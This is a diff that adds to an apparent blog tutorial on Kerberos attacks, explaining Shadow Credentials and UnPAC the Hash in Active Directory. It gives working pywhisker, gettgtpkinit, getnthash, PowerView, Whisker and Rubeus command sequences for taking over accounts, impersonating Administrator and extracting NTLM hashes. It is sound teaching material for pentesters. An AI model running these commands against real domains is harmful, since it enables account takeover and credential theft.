@@ -763,7 +763,80 @@ Ticket combinations from Zero-Point Security</p>
 </code></pre>
 <h3 id="spn-jacking">SPN-Jacking</h3>
 <h3 id="shadow-credentials">Shadow Credentials</h3>
+<p>Shadow Credentials is an attack that abuses DACL permissions to add “Key Credentials” to the target object to then perform Kerberos authentication using PKINIT and gain access as that user.</p>
+<p>For this attack to work, the domain must have ADCS installed and a CA configured, and we must have control of an account with write permissions over the object in order to add the keys.</p>
+<p>A lot of the information I will be covering here is from <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">this</a> SpecterOps post. It is a really great read, but I’ll explain it here in a more summarized manner.</p>
+<p><strong>Let’s learn about Shadow Credentials</strong></p>
+<p><strong>What is PKINIT</strong></p>
+<p>As we covered in Pass the Certificate, PKINIT is a way to perform pre-authentication using asymmetrics keys. When a user enrolls into Windows Hello for Business (WHfB), the computer’s TPM (Trusted Platform Module) generates a a public-private key pair for the user’s account. The private key is stored in, and never leaves, the TPM. It is protected by a PIN code which can optionally be replaced with biometrics.</p>
+<p>If using the Key Trust model in PKI, the client’s public key is stored in an attribute called <code>msDS-KeyCredentialLink</code>. The values of this attribute are called Key Credentials. Each Key Credential contains information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and the public key itself.</p>
+<p>In normal Kerberos authentication, a client will encrypt their pre-auth data with their secret key, which is just their password hash, and send it to the KDC which decrypts it using the same key. This is symmetric encryption. However with PKINIT, the client will encrypt the pre-auth data with their private key, and the KDC will decrypt it with the client’s public key stored in the <code>msDS-KeyCredentialLink</code> attribute. This is asymmetric encryption.</p>
+<p>So, Key Credentials can request a TGT for a user. If we can write to this attribute on a user or computer object, we can generate our own key pair, add the public key to the attribute, and then use our generated private key to encrypt the pre-authentication data and request a TGT as that principal!</p>
+<p>This is the basis of the Shadow Credentials attack. We will:</p>
+<ul>
+<li>create an RSA key pair</li>
+<li>create an X509 certificate configured with the public key</li>
+<li>create a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af">KeyCredential</a> structure featuring the raw public key and add it to the <code>msDS-KeyCredentialLink</code> attribute</li>
+<li>authenticate using PKINIT and the certificate and private key</li>
+</ul>
+<p><strong>Abuse in Linux:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Enumerate principals with write access over another principal's msDS-KeyCredentialLink attribute</span>
+
+2. <span class="token comment"># Compromise the privileged account. After that, list keys that may be present on the target to keep track of this for later when clearing.</span>
+   pywhisker.py -d <span class="token string">"domain.local"</span> -u <span class="token string">"user1"</span> -p <span class="token string">"complexpassword"</span> --target <span class="token string">"user2"</span> --action <span class="token string">"list"</span>
+	 
+3. <span class="token comment"># Then add the new key pair to the target. Keep track of the certificate file &amp; certificate password</span>
+   pywhisker.py -d <span class="token string">"domain.local"</span> -u <span class="token string">"user1"</span> -p <span class="token string">"complexpassword"</span> --target <span class="token string">"user2"</span> --action <span class="token string">"add"</span> --filename test1
+
+4. <span class="token comment"># Request a TGT for the account using the password and cert. Keep note of the printed 'AS-REP encryption key' for use with UnPAC the Hash.</span>
+   gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache
+	 
+4. <span class="token comment"># Now save the TGT in to your environment variable to use it</span>
+   <span class="token function">export</span> KRB5CCNAME<span class="token operator">=</span>user2.ccache
+</code></pre>
+<p><strong>Abuse in Windows:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Let's import PowerView and enumerate principals with write access over the msDS-KeyCredentialLink attribute on other principals.</span>
+	 a. <span class="token comment"># Import PowerView</span>
+		  Import-Module PowerView.ps1
+		  
+	 b. <span class="token comment"># Identify users/groups/machines with write access over the msds-key-credential-link attribute on a computer.</span>
+		  <span class="token comment"># Make sure to put in your domain and domain SID!</span>
+		  Get-DomainComputer -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+		  
+	 c. <span class="token comment"># Now identify users/groups/machines with write access over the msds-key-credential-link attribute on a user.</span>
+		  <span class="token comment"># Again, make sure to put in your domain and domain SID!</span>
+	 	  Get-DomainUser -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+
+2. <span class="token comment"># Compromise the privileged account from step 1. After that, list keys that may be present on the target to keep track of this for later when clearing.</span>
+   Whisker.exe list /target:dc$
+	 
+3. <span class="token comment"># Next add the new key pair to the target. Keep track of the printed password and the base64 certificate.</span>
+   Whisker.exe add /target:dc$
+	 
+4. <span class="token comment"># Use Rubeus to request a TGT of the target principal by using the base64 cert and the cert's password. Notice this is the same command as in the Pass the Certificate!</span>
+   Rubeus.exe asktgt /user:dc$ /certificate:<span class="token operator">&lt;</span>base64 cert<span class="token operator">&gt;</span> /password:<span class="token operator">&lt;</span>cert pass<span class="token operator">&gt;</span> /nowrap
+	 
+5. <span class="token comment"># After obtaining the computer TGT, we can do S4U2Self to get a Service Ticket as any user to the target computer.</span>
+   Rubeus.exe s4u /user:dc$ /ticket:<span class="token operator">&lt;</span>base64 TGT<span class="token operator">&gt;</span> /impersonateuser:Administrator /altservice:cifs/dc.testlab.com /self /nowrap
+	 
+6. <span class="token comment"># Now pass into createnetonly</span>
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:randompass /ticket:<span class="token operator">&lt;</span>base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /show
+</code></pre>
 <h3 id="unpac-the-hash">UnPAC the Hash</h3>
+<p>Let’s add on to what we learned from the Shadow Credentials attack, if a TGT was obtained with PKINIT, and you use it to request a service ticket, the service ticket will contain the NTLM hash of the user/computer that the TGT belongs to, inside the PAC in the PAC_CREDENTIAL_INFO field. And just like normal, the ticket is encrypted using the key of the service it is issued for. This was implemented for compatibility in the event the user/computer needs to access resources that require NTLM authentication.</p>
+<p>Typically we shouldn’t be able to decrypt a service ticket because it will be encrypted with the service’s password hash. Except if we perform U2U + S4U2Self, we will be able to decrypt the service ticket because it is for ourself (remember a U2U service ticket is encrypted with the session key associated with the TGT which we got from the AS-REP), and then we can decrypt the service ticket using the obtained session key to read the PAC and obtain the user/computer’s NTLM hash.</p>
+<p>This is the UnPAC the Hash attack.</p>
+<p><strong>Abuse in Linux:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token comment"># Only proceed below if you did all the abuse steps from the Shadow Credentials Abuse in Linux section.</span>
+<span class="token comment"># Also make sure you have the printed out 'AS-REP encryption key' from before.</span>
+
+1. <span class="token comment"># After the ticket is exported into the environment variable, we can run getnthash to obtain the NT hash of the account.</span>
+   getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a1553f15fdf24731731cecad16 domain.local/user2
+</code></pre>
+<p><strong>Abuse in Windows:</strong></p>
+<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># For Windows, it is like the pass the certificate command we know, but we just add the /getcredentials flag</span>
+   Rubeus.exe asktgt /getcredentials /user:dc$ /certificate:<span class="token operator">&lt;</span>base64 cert<span class="token operator">&gt;</span> /password:<span class="token operator">&lt;</span>cert pass<span class="token operator">&gt;</span> /domain:testlab.com /dc:dc.testlab.com /show
+</code></pre>
 <br>
 <h2 id="conclusion">Conclusion</h2>
 <p>Kerberos is certainly not an easy topic to grasp at first — it has lots of moving parts and terminology which make it difficult to understand. I created this blog with the goal of breaking down this complex protocol and make it simple enough for people wanting to learn more about how it works and the attacks associated with it. After reading this blog, you should have a solid grasp on Kerberos, and the ability to find and exploit many attacks from both Linux and Windows machines.</p>
